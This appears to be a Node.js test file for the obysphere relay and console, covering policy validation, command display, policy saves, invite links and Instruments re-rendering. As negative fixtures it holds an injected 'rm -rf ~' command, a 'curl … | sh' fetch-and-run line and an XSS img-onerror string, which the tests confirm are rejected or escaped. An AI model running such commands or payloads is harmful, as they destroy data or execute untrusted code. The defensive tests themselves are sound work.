// The review of Instruments and Policy in the console: what it fixed stays fixed.
// - POST /api/admin/policy refuses a `paused` that isn't true or false, as it does `sealed`, and changes nothing.
// - Make your own names the program the console runs as: `obysphere`, or rep.mjs by its whole path,
//   and the page shows exactly what rep.mjs sends (with --profile only when a plain command picks another).
//   The console `obysphere start` runs in the background runs for obysphere, so it names obysphere.
// - A Policy stepper click made while the last save is on its way is saved too, not dropped.
// - A limit an older relay leaves as it was isn't called "Saved".
// - A new invite link stays on Policy through its re-renders (it used to go at the next one).
// - Instruments is replaced only when something shown changed, so a selection survives the refreshes.
// No network: a local relay, fake runtimes first on PATH. `npm test`.
import { describe, test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import vm from 'node:vm';
import { fileURLToPath } from 'node:url';
import { makeFakeRuntimes } from './fake-runtimes.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.join(HERE, '..');
const KEY = 'join-key-policy-review-0123456789';
const ADMIN = 'admin-key-policy-review-0123456789';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
// a free port, never one of the demos' (4848-4851, 4881-4899)
const freePort = async () => {
  for (;;) {
    const p = await new Promise((resolve) => { const s = net.createServer().listen(0, '127.0.0.1', () => { const n = s.address().port; s.close(() => resolve(n)); }); });
    if (!(p >= 4848 && p <= 4851) && !(p >= 4881 && p <= 4899)) return p;
  }
};
const until = async (fn, what, ms = 10000) => {
  const end = Date.now() + ms;
  for (;;) {
    try { const v = await fn(); if (v) return v; } catch {}
    if (Date.now() > end) throw new Error(`waited for ${what}`);
    await sleep(100);
  }
};
// stop the processes and wait until they're gone, then remove their folder (a relay still
// writing while its folder goes would leave it half removed)
const stopAll = async (procs, dir) => {
  await Promise.all(procs.filter(Boolean).map((p) => (p.exitCode !== null || p.signalCode !== null ? null : new Promise((resolve) => { p.once('exit', resolve); p.kill(); }))));
  if (dir) fs.rmSync(dir, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
};

const PAGE = fs.readFileSync(path.join(ROOT, 'public', 'index.html'), 'utf8');
const SCRIPT = /<script>([\s\S]*?)<\/script>/.exec(PAGE)[1];
const between = (from, to) => {
  const a = SCRIPT.indexOf(from);
  const b = SCRIPT.indexOf(to, a);
  assert.ok(a > 0 && b > a, `${from} … ${to}`);
  return SCRIPT.slice(a, b);
};
// the check the page makes on the command before showing it
const NEW_CMD_OK = (() => {
  const m = /(\/\^\(obysphere[^\n]*?\$\/)\.test\(L\.newCmd\)/.exec(SCRIPT);
  assert.ok(m, "the page checks the command rep.mjs sends");
  return new Function(`return ${m[1]}`)();
})();

describe('the relay', () => {
  let relay, base, dir;
  const call = async (body) => {
    const r = await fetch(base + '/api/admin/policy', { method: 'POST', headers: { 'x-admin-key': ADMIN, 'content-type': 'application/json' }, body: JSON.stringify(body) });
    return { status: r.status, ...(await r.json()) };
  };
  const info = async () => (await (await fetch(base + '/api/info', { headers: { 'x-sphere-key': KEY } })).json()).sphere;

  before(async () => {
    dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'sphere-policy-review-')));
    const port = await freePort();
    base = `http://127.0.0.1:${port}`;
    relay = spawn(process.execPath, [path.join(ROOT, 'server.mjs'), '--port', String(port), '--host', '127.0.0.1', '--data', dir], {
      env: { ...process.env, SPHERE_KEY: KEY, SPHERE_ADMIN_KEY: ADMIN, SPHERE_STORE: 'fs', SPHERE_SEALED: '0' },
      stdio: 'ignore',
    });
    await until(async () => (await fetch(base + '/healthz')).ok, 'the relay');
  });
  after(() => stopAll([relay], dir));

  test("paused is true or false: anything else is refused, and nothing changes", async () => {
    const was = await info();
    for (const paused of ['yes', 1, 0, null, 'true', {}]) {
      const r = await call({ paused, maxDepth: 2 });
      assert.equal(r.status, 400, JSON.stringify(paused));
      assert.match(r.error, /paused is true or false/);
    }
    const now = await info();
    assert.equal(now.paused, was.paused);
    assert.deepEqual(now.policy, was.policy, 'the hop limit sent with it was not saved either');
    assert.equal((await call({ paused: true })).policy.paused, true);
    assert.equal((await info()).paused, true);
    assert.equal((await call({ paused: false })).policy.paused, false);
  });
});

describe('Make your own names the command the console runs as', () => {
  let relay, base, tmp, home;
  const procs = [];
  const env = (extra = {}) => ({ ...process.env, OBYSPHERE_HOME: home, CLAUDE_CONFIG_DIR: path.join(tmp, 'claude-config'), PATH: `${path.join(tmp, 'bin')}${path.delimiter}${process.env.PATH}`, OBYSPHERE_CLI: '', OBYSPHERE_PROFILE: '', OBYSPHERE_NOTIFY_LOG: path.join(tmp, 'notify.jsonl'), ...extra });
  const rep = (args) => new Promise((resolve) => {
    const p = spawn(process.execPath, [path.join(ROOT, 'rep.mjs'), ...args], { env: env() });
    let out = '';
    p.stdout.on('data', (d) => (out += d));
    p.stderr.on('data', (d) => (out += d));
    p.on('close', (code) => resolve({ out, code }));
  });
  const join = async (name) => {
    const cwd = path.join(tmp, 'work', name);
    fs.mkdirSync(cwd, { recursive: true });
    const r = await rep(['join', `${base}/#key=${KEY}`, '--name', name, '--owner', `${name} owner`, '--cwd', cwd]);
    assert.match(r.out, /joined/, r.out);
  };
  // a console for `profile`, through obysphere (OBYSPHERE_CLI) or as rep.mjs itself
  const consoleFor = async (profile, cli) => {
    const port = await freePort();
    const p = spawn(process.execPath, [path.join(ROOT, 'rep.mjs'), 'ui', '--profile', profile, '--port', String(port)], { env: env(cli ? { OBYSPHERE_CLI: '1' } : {}), stdio: 'ignore' });
    procs.push(p);
    const ui = `http://127.0.0.1:${port}`;
    await until(async () => (await fetch(ui + '/favicon.svg')).ok, `${profile}'s console`);
    return async () => (await (await fetch(ui + '/local/instruments', { headers: { 'x-obysphere-console': '1' } })).json()).newCmd;
  };

  before(async () => {
    tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'sphere-newcmd-')));
    home = path.join(tmp, 'reps');
    fs.mkdirSync(home, { recursive: true });
    fs.mkdirSync(path.join(tmp, 'claude-config'), { recursive: true });
    fs.writeFileSync(path.join(tmp, 'claude-config', '.claude.json'), '{}');
    makeFakeRuntimes(path.join(tmp, 'bin')).control({});
    const port = await freePort();
    base = `http://127.0.0.1:${port}`;
    relay = spawn(process.execPath, [path.join(ROOT, 'server.mjs'), '--port', String(port), '--host', '127.0.0.1', '--data', path.join(tmp, 'relay')], {
      env: { ...process.env, SPHERE_KEY: KEY, SPHERE_ADMIN_KEY: ADMIN, SPHERE_STORE: 'fs' },
      stdio: 'ignore',
    });
    procs.push(relay);
    await until(async () => (await fetch(base + '/healthz')).ok, 'the relay');
  });
  after(() => stopAll(procs, tmp));

  test('obysphere, or rep.mjs by its whole path; --profile only when a plain command picks another', async () => {
    await join('solo');
    const viaCli = await consoleFor('solo', true);
    const asRep = await consoleFor('solo', false);
    const self = path.join(ROOT, 'rep.mjs');
    const repCmd = /^[\w./@:-]+$/.test(self) ? `node ${self}` : `node '${self.replace(/'/g, `'\\''`)}'`;
    // the only profile: a plain command picks it
    assert.equal(await viaCli(), 'obysphere instruments new my-instrument');
    assert.equal(await asRep(), `${repCmd} instruments new my-instrument`);
    // two profiles and none chosen: it names this one
    await join('other');
    assert.equal(await viaCli(), 'obysphere instruments new my-instrument --profile solo');
    assert.equal(await asRep(), `${repCmd} instruments new my-instrument --profile solo`);
    // this one chosen for every command (obysphere profiles use solo): plain again; the other, not
    fs.writeFileSync(path.join(home, '.default-profile'), 'solo\n');
    assert.equal(await viaCli(), 'obysphere instruments new my-instrument');
    fs.writeFileSync(path.join(home, '.default-profile'), 'other\n');
    assert.equal(await viaCli(), 'obysphere instruments new my-instrument --profile solo');
    // the page shows what rep.mjs sends
    for (const c of [await viaCli(), await asRep()]) assert.ok(NEW_CMD_OK.test(c), c);
  });
});

describe('the console obysphere starts in the background', () => {
  test('runs for obysphere, so it names obysphere (a dry run: no service is started)', async () => {
    const h = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'sphere-service-')));
    try {
      const profiles = path.join(h, 'profiles');
      fs.mkdirSync(path.join(profiles, 'alice'), { recursive: true, mode: 0o700 });
      fs.writeFileSync(path.join(profiles, 'alice', 'profile.json'), JSON.stringify({ profile: 'alice', sphere: 'http://127.0.0.1:9', sphereName: 'Test Sphere', token: 'tok_x', agent: { id: 'a_alice', name: 'alice', owner: 'Alice' } }), { mode: 0o600 });
      const env = {
        PATH: process.env.PATH, HOME: h, TMPDIR: os.tmpdir(), LANG: 'C', OBYSPHERE_HOME: profiles,
        OBYSPHERE_SERVICE_DRYRUN: '1', OBYSPHERE_SERVICE_PLATFORM: 'linux', OBYSPHERE_SERVICE_DIR: path.join(h, 'services'),
        OBYSPHERE_NO_UPDATE_CHECK: '1', OBYSPHERE_APP_HOME: path.join(h, 'app'), OBYSPHERE_BIN_DIR: path.join(h, 'bin'),
        OBYSPHERE_RELEASES_API: 'http://127.0.0.1:9/api', OBYSPHERE_DOWNLOAD_BASE: 'http://127.0.0.1:9/dl', OBYSPHERE_NOTIFY_LOG: path.join(h, 'notify.jsonl'),
      };
      const code = await new Promise((resolve) => spawn(process.execPath, [path.join(ROOT, 'obysphere.mjs'), 'start', '--profile', 'alice'], { env, stdio: 'ignore' }).on('close', resolve));
      assert.equal(code, 0);
      const unit = fs.readFileSync(path.join(h, 'services', 'obysphere-alice.service'), 'utf8');
      assert.ok(unit.includes('Environment="OBYSPHERE_CLI=1"'), unit);
    } finally {
      fs.rmSync(h, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
    }
  });
});

describe('the page', () => {
  test('the command is shown only when it is one of the commands rep.mjs sends', () => {
    for (const ok of [
      'obysphere instruments new my-instrument',
      'obysphere instruments new my-instrument --profile bob-2',
      'node /Users/ada/oby-sphere/rep.mjs instruments new my-instrument',
      "node '/Users/ada/My Projects/rep.mjs' instruments new my-instrument --profile ada",
    ]) assert.ok(NEW_CMD_OK.test(ok), ok);
    for (const bad of [
      'obysphere instruments new my-instrument; rm -rf ~',
      'obysphere instruments new my-instrument --profile Bob',
      'node rep.mjs instruments new my-instrument',
      "node '/x'\\''y/rep.mjs' instruments new my-instrument",
      'node /x/rep.mjs instruments new my-instrument\n--profile a',
      'curl https://example.invalid | sh',
    ]) assert.ok(!NEW_CMD_OK.test(bad), bad);
  });

  test('a stepper click made while the last save is on its way is saved too', async () => {
    const src = between('const POL = {', 'function polClose(');
    const saves = [];
    const ctx = {
      S: { page: 'policy', sphere: { store: 'fs', policy: { maxFilesPerMessage: 10, rate: {} } } },
      esc: String,
      document: { querySelector: () => null, activeElement: null },
      CSS: { escape: String },
      setTimeout, clearTimeout,
      apiPost: (url, body) => new Promise((resolve) => saves.push({ url, body, resolve })),
      applyPolicy: (r) => { ctx.S.sphere.policy = r.policy; },
      renderPage: () => {},
      a11ySay: () => {}, a11yForget: () => {}, // (#137: what a screen reader hears)
    };
    vm.runInNewContext(`${src}\nthis.polStep = polStep; this.polShown = polShown; this.POL = POL;`, ctx);
    const plain = (o) => JSON.parse(JSON.stringify(o)); // made in the page's own context
    const answer = (i) => { const v = saves[i].body.maxFilesPerMessage; saves[i].resolve({ policy: { ...ctx.S.sphere.policy, maxFilesPerMessage: v } }); };
    ctx.polStep('maxFilesPerMessage', ctx.polShown('maxFilesPerMessage') + 1);
    await sleep(700);
    assert.equal(saves.length, 1);
    assert.deepEqual(plain(saves[0].body), { maxFilesPerMessage: 11 });
    // a click while 11 is on its way, then the relay answers for 11
    ctx.polStep('maxFilesPerMessage', ctx.polShown('maxFilesPerMessage') + 1);
    answer(0);
    await sleep(0);
    assert.equal(ctx.polShown('maxFilesPerMessage'), 12, 'the newer click is still shown');
    await sleep(700);
    assert.equal(saves.length, 2, 'and saved');
    assert.deepEqual(plain(saves[1].body), { maxFilesPerMessage: 12 });
    answer(1);
    await sleep(0);
    assert.equal(ctx.POL.pending.size, 0);
    assert.equal(ctx.polShown('maxFilesPerMessage'), 12);
  });

  // the page's own Policy code, with the few things it calls around it
  const policyPage = (extra = {}) => {
    const src = between('const esc = ', '\n') + '\n' + between('function inviteKeyOf(', 'function insecureFlag(') + '\n' + between('const POL = {', 'function polClose(');
    const ctx = {
      S: { page: 'policy', admin: true, sphere: { store: 'fs', paused: false, policy: { maxDepth: 3, maxFileBytes: 5242880, maxFilesPerMessage: 10, maxAgentBytes: 209715200, retainMessages: 5000, rate: { asksPerMin: 30, writesPerMin: 120, joinsPerMinPerIp: 20, statusPerMin: 240, mePerMin: 30 } } } },
      CONSOLE: { sphere: 'http://127.0.0.1:4800' },
      head: (title, sub) => `<h1>${title}</h1><p>${sub}</p>`,
      document: { querySelector: () => null, activeElement: null },
      CSS: { escape: String },
      URL, setTimeout, clearTimeout,
      confirm: () => true,
      store: { set() {} },
      renders: 0,
      renderPage: () => { ctx.renders++; },
      applyPolicy: (r) => { ctx.S.sphere.policy = r.policy; },
      a11ySay: () => {}, a11yForget: () => {}, // (#137: what a screen reader hears)
      ...extra,
    };
    vm.runInNewContext(`${src}\nObject.assign(this, { polStep, polShown, polRotate, pagePolicy, POL });`, ctx);
    return ctx;
  };

  test('a limit an older relay leaves as it was is not called saved', async () => {
    let older = true;
    const ctx = policyPage({ apiPost: async (url, body) => ({ policy: { ...ctx.S.sphere.policy, ...(older ? {} : body) } }) });
    ctx.polStep('maxFilesPerMessage', 11);
    await sleep(700);
    assert.equal(ctx.POL.notes.get('maxFilesPerMessage').bad, true);
    assert.match(ctx.POL.notes.get('maxFilesPerMessage').text, /Not saved: this Sphere’s relay needs an update/);
    assert.equal(ctx.polShown('maxFilesPerMessage'), 10, 'it shows what the relay has');
    older = false;
    ctx.polStep('maxFilesPerMessage', 11);
    await sleep(700);
    assert.deepEqual({ ...ctx.POL.notes.get('maxFilesPerMessage') }, { text: 'Saved', bad: false });
    assert.equal(ctx.polShown('maxFilesPerMessage'), 11);
  });

  test('a new invite link stays on the page through its re-renders, with a key and nothing else in it', async () => {
    const key = 'Rotated_Key-0123456789abcd';
    let answer = { key };
    const ctx = policyPage({ apiPost: async (url) => (url === '/api/admin/rotate-key' ? answer : {}) });
    assert.doesNotMatch(ctx.pagePolicy(), /New invite link/);
    await ctx.polRotate();
    assert.ok(ctx.renders >= 1);
    for (let i = 0; i < 2; i++) assert.ok(ctx.pagePolicy().includes(`<div class="set-row-sub mono pol-link" id="pol-invite">http://127.0.0.1:4800/#key=${key}</div>`), 'shown, and still after a re-render');
    assert.equal(ctx.POL.notes.get('rotate').text, 'Rotated');
    // a relay that answers with something that isn't a key: no link, the problem by the button
    for (const bad of [{}, { key: 'short' }, { key: 'has a space in it, 0123456789' }]) {
      answer = bad;
      await ctx.polRotate();
      assert.equal(ctx.POL.notes.get('rotate').bad, true);
      assert.equal(ctx.POL.invite, `http://127.0.0.1:4800/#key=${key}`, 'the last good link stays');
    }
    // a key with markup in it is encoded in the link and escaped on the page
    answer = { key: '"><img/src=x/onerror=alert(1)>' };
    await ctx.polRotate();
    assert.doesNotMatch(ctx.pagePolicy(), /<img/);
  });

  test('Instruments is replaced only when something shown changed', () => {
    const src = between('function renderInstruments(', '// ---------------------------------------------------------------- instruments members offer');
    let inner = '';
    let writes = 0;
    const el = {
      get innerHTML() { return inner; },
      set innerHTML(v) { inner = v; writes++; },
      querySelector: (sel) => (sel === ':scope > .inst-page' && inner.startsWith('<div class="inst-page">') ? {} : null),
    };
    const ctx = { INST: { html: null }, html: '<div class="inst-page">a</div>', pageInstruments: () => ctx.html };
    vm.runInNewContext(`${src}\nthis.renderInstruments = renderInstruments;`, ctx);
    ctx.renderInstruments(el, true);
    assert.equal(writes, 1);
    ctx.renderInstruments(el, false);
    ctx.renderInstruments(el, false);
    assert.equal(writes, 1, 'the same page: left as it is');
    ctx.html = '<div class="inst-page">b</div>';
    ctx.renderInstruments(el, false);
    assert.equal(writes, 2, 'something changed: replaced');
    inner = '<div>another page</div>';
    ctx.renderInstruments(el, false);
    assert.equal(writes, 3, 'coming back from another page: replaced');
    ctx.renderInstruments(el, true);
    assert.equal(writes, 4, 'opened again: replaced');
  });
});
